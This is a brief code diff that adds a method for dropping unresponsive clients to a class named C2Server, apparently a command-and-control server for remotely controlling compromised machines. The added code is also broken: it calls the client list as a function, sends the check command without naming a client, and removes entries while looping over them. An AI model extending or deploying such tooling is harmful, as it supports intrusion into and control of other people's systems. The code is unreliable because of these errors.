@@ -78,6 +78,11 @@ class C2Server:
             log.info(f"[!] Error: {e}")
             self.clients.remove(client)
 
+    def remove_dead(self):
+        for checkclient in self.clients():
+            response = self.send_command("info")
+            if response == "":
+                self.clients.remove(checkclient)
 
 if __name__ == "__main__":
     items = ["Start Server","Check Clients", "Connect to Client", "Exit"]
